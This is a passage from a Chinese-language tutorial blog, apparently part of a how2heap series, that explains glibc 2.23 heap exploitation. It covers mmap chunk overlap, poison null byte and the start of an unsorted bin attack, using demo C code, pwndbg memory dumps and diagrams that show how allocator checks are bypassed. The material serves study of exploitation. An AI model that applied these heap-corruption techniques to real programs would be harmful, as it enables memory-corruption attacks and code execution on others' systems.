class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n当前系统内存布局\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;....\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;....\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line"><span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line"><span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第一个 mmap 的 prev_size: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;第三个 mmap 的 size: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n&quot;</span>);</span><br><span class="line">    mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;现在改掉的第三个 mmap 块的大小是: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free 掉第三个 mmap 块,\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再分配一个很大的 mmap chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 Overlapped chunk 在: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk 的大小是: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新的堆块与第二个 mmap 块之间的距离: 0x%x\n&quot;</span>, distance);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写入之前 mmap chunk2 的 index0 写的是: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;编辑 overlapping chunk 的值\n&quot;</span>);</span><br><span class="line">    overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;写之后第二个 chunk 的值: 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk 的值: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新块已与先前的块重叠\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始申请了 3 个 0x100000 大小的堆<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-52.png#clientId=u38185df4-f4d6-4&from=paste&height=418&id=JCTtJ&margin=%5Bobject%20Object%5D&name=image.png&originHeight=835&originWidth=791&originalType=binary&size=677675&status=done&style=none&taskId=u9abe04a3-7168-40a6-9733-d55ff18f436&width=395.5" alt="image.png"><br>可以看到，普通堆区并没有分配的 0x100000 大小的堆。<br>然后查看相应的内存布局：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">The first mmap chunk goes directly above LibC: <span class="number">0x7fffff6a0010</span></span><br><span class="line">The second mmap chunk goes below LibC: <span class="number">0x7fffff520010</span></span><br><span class="line">The third mmap chunk goes below the second mmap chunk: <span class="number">0x7ffffef20010</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffff6a0000</span></span><br><span class="line"><span class="number">0x7fffff6a0000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000101002</span></span><br><span class="line"><span class="number">0x7fffff6a0010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff6a0020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff6a0030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff6a0040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7fffff520000</span></span><br><span class="line"><span class="number">0x7fffff520000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000101002</span></span><br><span class="line"><span class="number">0x7fffff520010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff520020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff520030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffff520040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x7ffffef20000</span></span><br><span class="line"><span class="number">0x7ffffef20000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000101002</span></span><br><span class="line"><span class="number">0x7ffffef20010</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffffef20020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffffef20030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffffef20040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后把第三个的 size 改成 0x202002<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-53.png#clientId=u38185df4-f4d6-4&from=paste&height=309&id=njK7W&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=1017&originalType=binary&size=646248&status=done&style=none&taskId=u334e294b-3df8-4042-80a0-c97fe1330ba&width=508.5" alt="image.png"><br>free 掉第三个，然后再去 malloc(0x300000)<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-54.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=XX3vY&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=582&originalType=binary&size=44129&status=done&style=none&taskId=u7f6741db-376b-47c4-8b1a-3c71138b5fb&width=291" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-55.png#clientId=u38185df4-f4d6-4&from=paste&height=31&id=JApc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=62&originWidth=559&originalType=binary&size=46123&status=done&style=none&taskId=u3a66a5c0-d5c7-442f-9723-717b01d968d&width=279.5" alt="image.png"><br>新块距离第二个 mmap 块 0x42000<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-56.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=EofbB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=886&originalType=binary&size=55992&status=done&style=none&taskId=ude624104-d595-499b-90f6-482b630f2ba&width=443" alt="image.png"><br>写入前 mmap 块 2 的索引 0 的值：0<br>写入后：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-57.png#clientId=u38185df4-f4d6-4&from=paste&height=305&id=OfhSX&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1033&originalType=binary&size=694967&status=done&style=none&taskId=u876b92d0-802b-4c31-8f55-072f7bb7b26&width=516.5" alt="image.png"><br>这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里的数据。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-58.png#clientId=u38185df4-f4d6-4&from=paste&height=469&id=nhwuf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=875&originalType=binary&size=878998&status=done&style=none&taskId=u206739db-6236-4085-942e-83ed57c6cd1&width=437.5" alt="image.png"></p><h1 id="poison-null-byte-2-23"><a href="#poison-null-byte-2-23" class="headerlink" title="poison_null_byte-2.23"></a>poison_null_byte-2.23</h1><p><strong>翻译：</strong><br>这个技术可被用于当可以被 malloc 的区域（也就是 heap 区域）存在一个单字节溢出漏洞的时候。<br>我们先分配 0x100 个字节的内存，代号’a’。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-59.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u5332779a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=601&originWidth=1052&originalType=binary&size=407596&status=done&style=none&taskId=u9d6172d7-16fa-44c2-aa70-87ac6d04b53&width=526" alt="image.png"><br>如果我们想要去溢出 a 的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是 0x108。<br>为什么是 0x108 呢，是因为所以 chunk 的头部需要占用 0x10 字节，但是 chunk 可以使用下一个 chunk 头部的 prev_size 位，就节省了 0x8 字节，所以最后是占用了 0x108 字节。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-60.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=u8b4851bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=577&originWidth=1365&originalType=binary&size=728992&status=done&style=none&taskId=u63a5e533-4198-4fbe-a191-c2dca5db548&width=682.5" alt="image.png"><br>然后接着我们分配 0x200 个字节，代号’b’。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-61.png#clientId=u347f053a-7aac-4&from=paste&height=309&id=ue93ab3d7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=617&originWidth=1148&originalType=binary&size=649735&status=done&style=none&taskId=u9dc10b62-3b11-496b-95de-9caf3992412&width=574" alt="image.png"><br>此时堆内存布局如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-62.png#clientId=u347f053a-7aac-4&from=paste&height=148&id=uc5e70fd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=295&originWidth=538&originalType=binary&size=159216&status=done&style=none&taskId=u63231e7b-2f8d-4edc-a4fc-2f82a057732&width=269" alt="image.png"><br>再分配 0x100 个字节，代号’c’。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-63.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u423519cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=591&originWidth=1133&originalType=binary&size=405738&status=done&style=none&taskId=u94a732ca-f9f8-4ab6-84f2-7db0ec08c52&width=566.5" alt="image.png"><br>然后分配一个 0x100 字节的 barrier 在 0x8008440，以便在释放时 c 不会与顶部块合并（这个障碍并不是绝对必要的，但是可以让事情变得不那么混乱）<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-64.png#clientId=u347f053a-7aac-4&from=paste&height=267&id=ub82ff069&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=510&originalType=binary&size=250039&status=done&style=none&taskId=ud073f0fb-3f9f-4b25-9808-51e3b549156&width=255" alt="image.png"><br>在新版 glibc 环境下，我们需要在 b 内部更新 size 来逃避检测 <strong>‘chunksize(P) != prev_size (next_chunk(P))’</strong></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br><span class="line"><span class="built_in">free</span>(b)</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-65.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=uc80f2690&margin=%5Bobject%20Object%5D&name=image.png&originHeight=578&originWidth=685&originalType=binary&size=374695&status=done&style=none&taskId=u0671d3d9-a34a-469a-803d-96d98691d0d&width=342.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-66.png#clientId=u347f053a-7aac-4&from=paste&height=28&id=u625cb874&margin=%5Bobject%20Object%5D&name=image.png&originHeight=56&originWidth=453&originalType=binary&size=23547&status=done&style=none&taskId=u4744f654-460a-4710-984d-040fd67656f&width=226.5" alt="image.png"><br>此时堆内存布局如下：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-67.png#clientId=u347f053a-7aac-4&from=paste&height=151&id=u9e500445&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=542&originalType=binary&size=122557&status=done&style=none&taskId=u129e444d-eeb5-4bda-a8a7-57a90e3829e&width=271" alt="image.png"></p><p>我们在 a 实现一个单字节的 null byte 溢出。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-68.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u14eaae63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=592&originWidth=1095&originalType=binary&size=548441&status=done&style=none&taskId=ubb192e74-9239-455a-a70e-f3635c1e1cf&width=547.5" alt="image.png"><br>可以看到 b 的 size 变成了 0x200<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-69.png#clientId=u347f053a-7aac-4&from=paste&height=196&id=udad05044&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=560&originalType=binary&size=215629&status=done&style=none&taskId=u54d31539-3a17-4293-b8d9-4d46d24dc77&width=280" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-70.png#clientId=u347f053a-7aac-4&from=paste&height=147&id=t6067&margin=%5Bobject%20Object%5D&name=image.png&originHeight=294&originWidth=542&originalType=binary&size=192046&status=done&style=none&taskId=ue48f1fd2-2a78-47b3-bc68-82d30fc82ee&width=271" alt="image.png"><br>为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">(<span class="number">0x211</span> &amp; <span class="number">0xff00</span>) == <span class="number">0x200</span></span><br></pre></td></tr></table></figure><p>然而此时 c.presize = 0x210 但是没关系我们还是能逃过掉前面那个检查，根据</p><ul><li>chunksize(P) == _((size_t_)(b-0x8)) == 0x200</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-71.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=udb9d75df&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=349&originalType=binary&size=15531&status=done&style=none&taskId=u872d4aa7-ddf6-44cb-88ed-dcefeb1f8c9&width=174.5" alt="image.png"></p><ul><li>prev_size (next_chunk(P)) == _(size_t_)(b-0x10 + 0x200) == 0x200</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-72.png#clientId=u347f053a-7aac-4&from=paste&height=26&id=u62a4d804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=51&originWidth=464&originalType=binary&size=20487&status=done&style=none&taskId=u592a1b66-9865-4f94-aa68-12c1ad333e3&width=232" alt="image.png"><br>可以成功绕过检查。另外 unsorted bin 中的 chunk 大小也变成了 0x200<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-73.png#clientId=u347f053a-7aac-4&from=paste&height=299&id=u041b16b4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=1095&originalType=binary&size=563900&status=done&style=none&taskId=u067af4f7-7887-4809-bbff-9fde5b59098&width=547.5" alt="image.png"><br>此时 c 附近的内存布局为：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-74.png#clientId=u38185df4-f4d6-4&from=paste&height=89&id=ubab11d5a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=630&originalType=binary&size=133263&status=done&style=none&taskId=u00b8c7ae-fce5-42f9-af3e-3ee466a238b&width=315" alt="image.png"><br>然后 malloc 一个大小 0x100 的<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-75.png#clientId=u347f053a-7aac-4&from=paste&height=246&id=u5287ab82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=717&originalType=binary&size=211710&status=done&style=none&taskId=u47f0c58b-bc17-41e6-8618-b79ccd5522f&width=358.5" alt="image.png"><br>返回给 b1 的地址就是前面 free 掉的 b 的地址。<br>这个时候 chunk c 的 prev_size 本应该变为 0xf0（0x200-0x110)。<br>注意分配堆块后，发生变化的是 fake c.prev_size，而不是 c.prev_size。现在 C 的 presize 在原来地址的前 0x10 bytes 处（2 个单元）更新。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>gx c<span class="number">-0x20</span></span><br><span class="line"><span class="number">0x8008310</span>:      <span class="number">0x00000000000000f0</span>      <span class="number">0x0000000000000000</span>   &lt;-fake chunk</span><br><span class="line"><span class="number">0x8008320</span>:      <span class="number">0x0000000000000210</span>      <span class="number">0x0000000000000110</span>   &lt;-chunk c</span><br><span class="line"><span class="number">0x8008330</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8008340</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8008350</span>:      <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk。但其实这片内存已经被分配给了 chunk b1。<br>再 b2 = malloc(0x80);<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-76.png#clientId=u347f053a-7aac-4&from=paste&height=325&id=u67d2c401&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=765&originalType=binary&size=432623&status=done&style=none&taskId=uad2f58c3-1b4a-4bc6-bceb-b69c2430848&width=382.5" alt="image.png"><br>查看 b2 内容<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-77.png#clientId=u347f053a-7aac-4&from=paste&height=43&id=u9891ba02&margin=%5Bobject%20Object%5D&name=image.png&originHeight=86&originWidth=1408&originalType=binary&size=66799&status=done&style=none&taskId=u4abc7e76-7fc1-430b-b003-67a1ca162ab&width=704" alt="image.png"><br>之后我们将 b1 和 c 依次 free。这会导致 b1 开始的位置一直到 c 的末尾中间的内存会合并成一块。<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-78.png#clientId=u347f053a-7aac-4&from=paste&height=245&id=ue1b01bcc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=690&originalType=binary&size=307368&status=done&style=none&taskId=u66134a2a-6185-42df-8286-348ccc688e4&width=345" alt="image.png"><br>为什么会发生合并？<br>在我们第一次 free(b)之前，进行了如下的设置：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">size_t</span>*)(b+<span class="number">0x1f0</span>) = <span class="number">0x200</span>;</span><br></pre></td></tr></table></figure><p>这一步确保了我们之后进行 null byte 溢出后，还能成功 free(b)，逃过** ‘chunksize(P) != prev_size (next_chunk(P))’** 的检查。<br>之后分配 b1 和 b2 的时候，presize 也会一直在(b+0x1f0)处更新。<br>而在最后 free(c)的时候，检查的是 c 的 presize 位，而因为最开始的 null byte 溢出，导致这块区域的值一直没被更新，一直是 b 最开始的大小 0x210 。<br>我们知道，两个相邻的 small chunk 被释放后会被合并在一起。首先释放 chunk b1，伪造出 fake chunk b 是 free chunk 的样子。然后释放 chunk c，因为 chunk c 的 prevsize 没有变化，这个时候 chunk c 会认为 chunk b1 就是 chunk b，这时程序会发现 chunk c 的前一个 chunk 是一个 free chunk，然后就将它们合并在了一起，并从 unsorted bin 中取出来合并进了 top chunk。 chunk b2 位于 chunk b1 和 chunk c 之间，被直接无视了，现在 malloc 认为这整块区域都是未分配的。</p><blockquote><p>补充：</p></blockquote><p>chunk 合并的过程如下，首先该 chunk 与前一个 chunk 合并，然后检查下一个 chunk 是否为 top chunk，如果不是，将合并后的 chunk 放回 unsorted bin 中，否则，合并进 top chunk：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/* consolidate backward */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    [...]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">    consolidate into top</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>d = malloc(0x300);之后<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-79.png#clientId=u347f053a-7aac-4&from=paste&height=292&id=u8ac32d1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=584&originWidth=856&originalType=binary&size=322110&status=done&style=none&taskId=u180d0ab4-b269-41a1-82ba-b7916de8294&width=428" alt="image.png"><br>返回的地址还是原来 b 的地址（0x8008120-0x10)，刚才没有 free 的 b2 也被包含在了里面<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-80.png#clientId=u347f053a-7aac-4&from=paste&height=221&id=u0df4b579&margin=%5Bobject%20Object%5D&name=image.png&originHeight=441&originWidth=728&originalType=binary&size=273747&status=done&style=none&taskId=ue4446f69-2c7e-4ee8-84e6-a39289eafa7&width=364" alt="image.png"><br>查看 b2 内容<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-81.png#clientId=u347f053a-7aac-4&from=paste&height=402&id=u2001de99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1817&originalType=binary&size=1146578&status=done&style=none&taskId=u0b17fedc-0d1f-4bbb-84a2-a65830e45a9&width=908.5" alt="image.png"><br>该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。<br>对于单字节溢出的利用有下面几种：</p><ul><li>扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x100</span>   <span class="number">0x100</span>    <span class="number">0x80</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   初始状态</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   释放 B</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="number">0x180</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>)</span><br><span class="line">|-------|-------|-------|   C 块被覆盖</span><br><span class="line">        |&lt;--实际得到的块-&gt;|</span><br></pre></td></tr></table></figure><ul><li>扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x100</span>   <span class="number">0x100</span>    <span class="number">0x80</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   初始状态</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="number">0x180</span></span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   释放 B</span><br><span class="line">|-------|-------|-------|</span><br><span class="line">|   A   |   B   |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>)</span><br><span class="line">|-------|-------|-------|   C 块被覆盖</span><br><span class="line">        |&lt;--实际得到的块-&gt;|</span><br></pre></td></tr></table></figure><ul><li>收缩被释放块(即本题)：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的 poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块。</li></ul><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x100</span>     <span class="number">0x210</span>     <span class="number">0x80</span></span><br><span class="line">|-------|---------------|-------|</span><br><span class="line">|   A   |       B       |   C   |   初始状态</span><br><span class="line">|-------|---------------|-------|</span><br><span class="line">|   A   |       B       |   C   |   释放 B</span><br><span class="line">|-------|---------------|-------|</span><br><span class="line">|   A   |       B       |   C   |   溢出 B 的 size 为 <span class="number">0x200</span></span><br><span class="line">|-------|---------------|-------|   之后的 <span class="built_in">malloc</span> 操作没有更新 C 的 prev_size</span><br><span class="line">         <span class="number">0x100</span>  <span class="number">0x80</span></span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>), <span class="built_in">malloc</span>(<span class="number">0x80</span><span class="number">-8</span>)</span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   释放 B1</span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并</span><br><span class="line">|-------|------|-----|--|-------|</span><br><span class="line">|   A   |  B1  | B2  |  |   C   |   <span class="built_in">malloc</span>(<span class="number">0x180</span><span class="number">-8</span>)</span><br><span class="line">|-------|------|-----|--|-------|   B2 将被覆盖</span><br><span class="line">        |&lt;实际得到的块&gt;|</span><br></pre></td></tr></table></figure><h1 id="unsorted-bin-attack-2-23"><a href="#unsorted-bin-attack-2-23" class="headerlink" title="unsorted_bin_attack-2.23"></a>unsorted_bin_attack-2.23</h1><p>这个例程通过 unsortedbin 攻击往栈中写入一个 unsigned long 的值。<br>在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。<br>比如，我们在栈上有一个栈单元 stack_var 需要被改写<br><img src= "/img/loading.gif" 